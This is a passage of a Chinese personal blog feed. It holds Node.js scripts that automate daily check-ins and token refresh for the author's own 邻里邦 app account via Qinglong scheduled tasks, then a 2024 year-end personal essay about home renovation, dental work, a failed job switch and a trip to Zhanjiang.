operator">!==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      configData<span class="token punctuation">.</span>token <span class="token operator">=</span> token    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>refreshToken <span class="token operator">!==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      configData<span class="token punctuation">.</span>refreshToken <span class="token operator">=</span> refreshToken    <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>configPath<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>configData<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"修改后的config.json数据："</span><span class="token punctuation">,</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"读取或修改config.json时出错："</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 刷新token</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">startRefreshToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> configData <span class="token operator">=</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取configData："</span><span class="token punctuation">,</span> configData<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>configData<span class="token punctuation">.</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"grant_type"</span><span class="token punctuation">,</span> <span class="token string">"refresh_token"</span><span class="token punctuation">)</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"client_secret"</span><span class="token punctuation">,</span> <span class="token string">"times"</span><span class="token punctuation">)</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"client_id"</span><span class="token punctuation">,</span> <span class="token string">"app_c"</span><span class="token punctuation">)</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"refresh_token"</span><span class="token punctuation">,</span> configData<span class="token punctuation">.</span>refreshToken<span class="token punctuation">)</span>    <span class="token keyword">let</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"Content-type"</span><span class="token operator">:</span> <span class="token string">"multipart/form-data"</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"请求参数："</span><span class="token punctuation">,</span> formData<span class="token punctuation">)</span>    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> data <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>      <span class="token string">"https://m-center-prod-linli.timesgroup.cn/times/auth/oauth/token"</span><span class="token punctuation">,</span>      formData<span class="token punctuation">,</span>      config    <span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"刷新token结果："</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">writeConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        token<span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>token<span class="token punctuation">,</span>        refreshToken<span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>refreshToken<span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"刷新tokenn时出错："</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 刷新token</span><span class="token function">startRefreshToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// times_signin.js</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"axios"</span><span class="token punctuation">)</span><span class="token comment">// 定义config.json文件的路径，假设它与脚本在同一目录下</span><span class="token keyword">const</span> configPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"config.json"</span><span class="token punctuation">)</span><span class="token comment">// 读取文件</span><span class="token keyword">function</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> existingData <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>configPath<span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"读取config.json数据："</span><span class="token punctuation">,</span> existingData<span class="token punctuation">)</span>  <span class="token keyword">return</span> existingData<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFormattedDateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> year <span class="token operator">=</span> now<span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> month <span class="token operator">=</span> <span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> day <span class="token operator">=</span> now<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> hour <span class="token operator">=</span> now<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> minute <span class="token operator">=</span> now<span class="token punctuation">.</span><span class="token function">getMinutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> second <span class="token operator">=</span> now<span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>year<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>month<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>day<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>hour<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>minute<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>second<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token comment">// 签到</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">startSignin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> configData <span class="token operator">=</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> currentTime <span class="token operator">=</span> <span class="token function">getFormattedDateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>currentTime<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>configData<span class="token punctuation">.</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      behaviourId<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>      clientCode<span class="token operator">:</span> <span class="token string">"sys_linlibang"</span><span class="token punctuation">,</span>      createTime<span class="token operator">:</span> currentTime<span class="token punctuation">,</span>      mapPamater<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        sign<span class="token operator">:</span> currentTime<span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      memberId<span class="token operator">:</span> <span class="token string">"3884010548647428143"</span><span class="token punctuation">,</span> <span class="token comment">//</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        Authorization<span class="token operator">:</span> <span class="token string">"Bearer "</span> <span class="token operator">+</span> configData<span class="token punctuation">.</span>token<span class="token punctuation">,</span>        <span class="token string">"Content-type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"请求参数："</span><span class="token punctuation">,</span> params<span class="token punctuation">)</span>      <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> data <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>        <span class="token string">"https://m-center-prod-linli.timesgroup.cn/times/member-bff/user-behaviour//api-c/v1/user-behaviour/collect"</span><span class="token punctuation">,</span>        params<span class="token punctuation">,</span>        config      <span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"签到结果："</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"签到成功！"</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"签到n时出错："</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>message<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"err"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 签到</span><span class="token function">startSignin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul><li>青龙面板 - 环境变量 - 创建变量 - 填入如下信息，phone 为自己已经注册邻里邦的手机号码（必填），code 为稍后运行 <code>times_get_code.js</code> 脚本后发送到手机上的验证码（首次配置时可为空，待获取验证码后再填写）<ul><li>名称：<code>TIMES_CONFIG</code></li><li>值：<code>&#123;&quot;phone&quot;:&quot;13412341234&quot;,&quot;code&quot;:&quot;103282&quot;&#125;</code></li></ul></li><li>注意：当前配置只针对 <code>+86</code> 的号码，非 <code>+86</code> 请自行在代码中修改区号</li></ul><h3 id="添加定时任务"><a href="#添加定时任务" class="headerlink" title="添加定时任务"></a>添加定时任务</h3><ul><li><p>任务一</p><ul><li>名称：<code>邻里邦获取验证码</code></li><li>命令/脚本：<code>task times_script/times_get_code.js</code></li><li>定时规则: <code>0 0 1 12 *</code></li></ul></li><li><p>任务二</p><ul><li>名称：<code>邻里邦获取token</code></li><li>命令/脚本：<code>task times_script/times_get_token.js</code></li><li>定时规则: <code>0 0 1 12 *</code></li></ul></li><li><p>任务三</p><ul><li>名称：<code>邻里邦刷新token（每三小时执行一次）</code></li><li>命令/脚本：<code>task times_script/times_refresh_token.js</code></li><li>定时规则: <code>0 */3 * * *</code></li></ul></li><li><p>任务四</p><ul><li>名称：<code>邻里邦签到</code></li><li>命令/脚本：<code>task times_script/times_signin.js</code></li><li>定时规则: <code>5 9 * * *</code></li></ul></li></ul><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><ul><li>运行前确认 <code>配置</code> 中的 <code>TIMES_CONFIG</code> 配置已填写 <code>phone</code></li><li>运行 <code>任务一</code> 获取验证码，把手机上获取到的验证码填写到 <code>配置</code> 中的 <code>TIMES_CONFIG</code> 的 <code>code</code> 中</li><li>运行 <code>任务二</code> 获取 token，token 会自动填写到 config.json 中</li><li>运行 <code>任务三</code> 刷新 token，任务会每隔三小时自动刷新一次</li><li>运行 <code>任务四</code> 进行签到，任务会在每天早上 9 点 5 分自动签到</li><li>到此不出意外的话签到任务会每天自动运行，不再需要人工干涉</li><li>如果出先签到不成功，请按照 <code>使用步骤</code> 在运行一次，如果还不行那就是接口改变了，需要重新调试代码</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;获取验证码&quot;&gt;&lt;a href=&quot;#获取验证码&quot; class=&quot;headerlink&quot; title=&quot;获取验证码&quot;&gt;&lt;/a&gt;获取验证码&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;接口：&lt;a href=&quot;https://m-center-prod-linli.timesgroup.c</summary>
      
    
    
    
    <category term="自动化" scheme="http://damao2250.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    
    <category term="邻里邦" scheme="http://damao2250.com/tags/%E9%82%BB%E9%87%8C%E9%82%A6/"/>
    
  </entry>
  
  <entry>
    <title>2024-细细的红线</title>
    <link href="http://damao2250.com/2024/12/20/2024-%E7%BB%86%E7%BB%86%E7%9A%84%E7%BA%A2%E7%BA%BF/"/>
    <id>http://damao2250.com/2024/12/20/2024-%E7%BB%86%E7%BB%86%E7%9A%84%E7%BA%A2%E7%BA%BF/</id>
    <published>2024-12-20T03:00:16.000Z</published>
    <updated>2025-05-09T04:06:36.957Z</updated>
    
    <content type="html"><![CDATA[<p>又到了一年一度的讲故事时间，那就少罗嗦先看故事吧</p><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/The_Thin_Red_Line.jpg" alt="The_Thin_Red_Line.jpg"></p><h2 id="《细细的红线》故事"><a href="#《细细的红线》故事" class="headerlink" title="《细细的红线》故事"></a>《细细的红线》故事</h2><p>1854年，在克里米亚战争的巴拉克拉瓦战役中，英国军队铸就了一个传奇般的军事神话——“细细的红线”。</p><p>当时，苏格兰高地兵团第93团肩负着阻击俄罗斯重骑兵的艰巨任务。由于兵力不足，无法形成坚固的方阵，代理指挥官克林做出了一个近乎疯狂的决策：在面对数量相当的俄国骑兵冲击时，他命令部队正面排列成两列横队，形成了一条细薄的战线。这种战术在当时的军事教条中是不被认可的，因为它风险极高——两列横队过于薄弱，一旦首轮射击未能击溃敌军，他们将直接面临被骑兵碾过的致命威胁。</p><p>然而，这些苏格兰勇士凭借他们高昂的士气和坚不可摧的心理素质，在距离敌军仅28码的近距离，直到能看清马匹眼白时才开火。他们的一次齐射便击倒了俄军一半的兵力，引发了俄军毁灭性的恐慌和溃败。最终，苏格兰高地兵团用他们的鲜血和子弹成功抵御了俄军的三轮冲锋，一战成名。战地记者在报道中写道：“阻挡在排山倒海般冲杀而来的俄军骑兵与英军基地之间的，只有“一道细细的红线。”，这红线指的正是身着红色军服的第93团官兵。</p><p>从此，英语里多了一个短语“细细的红线”(thin red line)，指的就是英国军人面对惊涛骇浪也岿然不动的大无畏精神。</p><h2 id="我的故事"><a href="#我的故事" class="headerlink" title="我的故事"></a>我的故事</h2><p>看完上面的故事，你应该也能联想到我今年也经历了“细细的红线”战役吧，其实并没有哈，只是今年太过于沉溺在短平快的信息流中了，魔法口袋中实在没有其他故事可以掏出来讲而已。其实现实中遇到的那些事，即使当下觉得非常惨烈与沉重，但只要不是生离死别，都远不如历史上的任何大事件。</p><p>今年可以说是非常平平无奇的一年，生活按部就班几乎没有任何波澜。本来也想偷懒不写的，但是不写吧，又觉得这一年真的白过了，于是在脑海里回想了好久，也掏出几件事记录如下吧</p><h3 id="整备小窝"><a href="#整备小窝" class="headerlink" title="整备小窝"></a>整备小窝</h3><p>  继2023年12月29日收楼之后，就开始忙着筹备各种家电家具，其实早在双十一就开始购买了一些，家电类的各种参数对比得眼花缭乱，最后选了美的居多。</p><p>  大件家具去佛山看的（姐夫的弟弟店里），因为是熟人全程看不到一个小时，就全部定好了主选和备选，回来他给我们发了价格表后就基本落定了。</p><p>  柜子也是大头，几乎2023年初份就开始下订了，中间改了一次风格（一开始决定跟一个邻居的一样，后来去看了另一个邻居的样板房，就照搬了另一个邻居的）。</p><p>  最搞笑的时当时还没收楼，房子也还没装修完，甚至瓷砖也没贴，我就着急让柜子定制的人来量尺寸（人家还是从增城跑来南沙的）。他们也没问我装修进度如何，我以为装修到那个程度就可以量了，但是人家以为的是已经都装修好了。<br>  结果他们来量尺的那天房地产那边就开始严管不给非工作人员进入，后来量尺的那个小伙子只能爬围墙进入，现在想想其实是非常危险的。最后他发现居然还差这么多还没装修，我估计他当时心里应该是在骂我的了。但是又不能白跑了这么远的路程，只能硬着头皮量了能量的，说剩下需要量的，等装修完后让我量了拍照给他就可以了。</p><p>  最后就是精装给刷的灰色墙漆，实在是太暗了无法忍受，叫人来重新刷了一遍白色的乳胶漆。前后对比真的差距太明显了。</p><p>  下面放一张最后选定的清单列表：<br>  <details><br>    <summary>点击展开查看大图</summary><br>    <img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/%E5%AE%B6%E5%85%B7%E5%AE%B6%E7%94%B5%E8%AE%BE%E5%A4%87%E9%80%89%E8%B4%AD%E6%B8%85%E5%8D%95_2024-12-20_15-13-30.png" alt="具家电设备选购清单"><br>  </details></p><h3 id="拔智齿"><a href="#拔智齿" class="headerlink" title="拔智齿"></a>拔智齿</h3><p>  在处理智齿这件事上真的是一把辛酸一把泪，一直以为自己的智齿长得很正不用拔也可以，以前经常睡觉会自己咬到自己，也没想到是因为智齿长的太大了，后来发现右下智齿有点发炎就决定去拔了（2020-07-05）。</p><p>  拔了之后没多久到了11月份发现，下排右边尖牙后后面的那颗牙（应该是叫第二前磨牙）每次喝冷水或者刷牙都非常酸痛，特别是进入十一月份开始转凉了。这个时候才记起来这个牙齿之前不知道啥时候崩了一个角，一直没注意，导致现在已经伤到里面的牙髓神经了（后面问了医生之后才知道是被两颗长得有点歪的智齿往中间挤，结果把它给挤崩的）。此时（2020-11-27）只能不得已做了根管治疗。</p><p>  还剩下三根智齿，睡觉还是经常会咬到自己，于是就去把左下的智齿给拔（2021-12-11），拔的时候医生说要不要顺便把左上的一颗也一起拔了，我说不用。唉，现在想来真是找罪受啊。心想着下面的都拔了，跟上面不会咬合，总不能还咬到自己吧！（自己立下的flag）</p><p>  后来还是逃不了要拔智齿，时间来到了今年的三月份，之前立下的flag，没多久就打脸了，虽然智齿不会咬合咬到自己，但是牙齿跟牙龈的硬度不是一样的啊！那段时间经常发生的不是左边的牙龈被智齿磨出溃疡就是右边磨！这可怎么忍受，说拔就拔（2024-03-30），先拔了一颗，过了一周立马去拔第二颗，终于给拔完了。</p><p>  本来应该两次要给它全拔完的，硬是被拖了近四年，拔了四次！这花钱还不说，还咔咔遭罪。所以听完我的辛酸史，智齿不好的，该拔还是尽早啊！</p><h3 id="大意所致的离职"><a href="#大意所致的离职" class="headerlink" title="大意所致的离职"></a>大意所致的离职</h3><p>  不是很想讲这段经历的，但它确实是属于我今年你的一部分，而且是很深刻的一部分。事情的起因是前公司老板发信息给我有意邀我回前公司（前公司离家比较近，现公司在市区离家较远，每天通勤2.5小时），我确实也厌倦了这么长的通勤时间。</p><p>  于是我也向她表明了自己的态度，经过一番沟通后约定了时间去前公司与技术总监沟通技术方向是否符合。经过沟通后当天技术总监已经向老板表明技术是OK的，然后老板也跟我谈了具体的薪资待遇。虽然是降薪了，但是胜在离家近啊，我欣然同意。</p><p>  此时（9月份），老板表示希望我能在国庆后入职，因为国庆后有一位员工期满离职，我也表示我回去回尽快提交离职申请，可能最慢需要30天，老板也表示理解。当时我也想着要不要让她给我发offer先的，但是我想着都这么熟了，而且技术总监面试也通过了，这应该不是很要紧。</p><p>  当时她也提了一嘴，就是找个时间（她并没有说具体得时间）和现在的技术组长见个面聊一下，以为那个所谓的技术组长我也认识，以前我在这家公司的准备要离职的前几个月他才来的公司。我说“ok啊，没问题”，因为都认识的我就没太放在心上。</p><p>  回到先公司后的第二天，我就提了离职，公司这边也同意了我国庆前离职，last day为9月30日。到周末就约了个时间跟那个技术组长聊了一会让技术，双方都觉得没啥问题。回来后就发现前老板始终没有给我其他的信息反馈了，也没有谈入职事宜。</p><p>  我觉得有点不对劲，就主动发了信息询问。结果才得知，她说技术组长反馈我的技术不符合公司的发展速度！我只能说“好的，很抱歉技术没能符合公司的预期”。我怀着好意提前办理好离职，生怕他们公司没能及时有人进去接手工作，这倒好，把自己的饭碗给砸了。</p><p>  事已至此，只能怪自己太大意了，或者说信任给的太多了，临近国庆，只能先安心做好离职交接工作。</p><p>  国庆先跟老婆回她家带了几天，体验摘百香果和钓鱼的乐趣。然后回老家，因为刚好是重阳节到奶奶迁坟的日子，就顺着回去呆了一周（前后呆了近半个月才回广州）。</p><p>  回到广州后就立马筹备着投简历，虽然这个时候又刚好碰上工作非常难找的时期，但是自己还是比较自信的（flag）。一开始先投家附近的，发现招聘人都是几个月甚至一年前在线的了，有些近期在线的投了也没有回应。就这样投了一周没回应信心瞬间减半。</p><p>  第二周把范围扩大，条件也放宽到外包，依然没有回应。在最后没希望的时候有一家有回应了，后来去面试也没问题，但是工资40%作为绩效，这谁顶的住，果断拒绝了。</p><p>  第三周投到了周三也没有回应，这个时候几乎没信心了。但是天无绝人之路，终于有一家约了面试，周四面完后都OK，虽然有点降薪，但是总好过没工作吧，于是当天就决定接下offer，第二天就立马入职了，入职立马开干…</p><h3 id="湛江之行"><a href="#湛江之行" class="headerlink" title="湛江之行"></a>湛江之行</h3><p>  12月14日在小昌的邀约下，我们俩去湛江见了冰。小昌本来是去参加他表妹的婚礼的，但是冰刚好就在附近，于是萌生想法，趁着周末先去看看冰，然后再去参加婚礼。他跟我提议后我俩一拍即合（其实他是想让我帮他分担他开车的路程）。</p><p>  到的时候已是中午，多年的老友许久未见面，必然是要喝上两杯的。冰也是好菜款待我们俩，龙虾、蟹、鲍鱼、花螺、海鱼、皮皮虾、生蚝，满桌全都是海鲜，吃不完根本吃不完。其实看他买的海鲜也不便宜，看着他买都有点心疼，全程下来花了得有两千来块。</p><p>  接近傍晚吃饱喝足没啥事了，冰带我们去海边远远参观了一下他们的“战舰”，然后回去简单吃个晚餐冰就得要回他的基地了，我们也回酒店休息了。</p><p>  附一张海边的图：<br>  <img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/20241220172537.jpg" alt="战舰"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>  一眨眼有到年末了，收获了脸庞的岁月划痕，也收获了很多无形的资产。总之尽了最大努力了，遗憾也好，痛苦也好，快乐也好，留在2024，2025继续加油！未来还是需要砥砺前行，不放弃就有希望！我的2025要充满干劲争取收获一台属于我们的车和小不点</p><h3 id="送给自己：无论现在是低谷还是高峰，请相信，凡事发生，皆有利于我"><a href="#送给自己：无论现在是低谷还是高峰，请相信，凡事发生，皆有利于我" class="headerlink" title="送给自己：无论现在是低谷还是高峰，请相信，凡事发生，皆有利于我"></a>送给自己：无论现在是低谷还是高峰，请相信，凡事发生，皆有利于我</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;又到了一年一度的讲故事时间，那就少罗嗦先看故事吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Damao2250/FileTransfer/master/The_Thin_Red_Line.jpg&quot; alt=&quot;The</summary>
      
    
    
    
    <category term="总结" scheme="http://damao2250.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="2024" scheme="http://damao2250.com/tags/2024/"/>
    
  </entry>
  
  <entry>
    <title>getBoundingClientRect-获取元素的位置</title>
    <link href="http://damao2250.com/2024/11/28/getBoundingClientRect-%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE/"/>
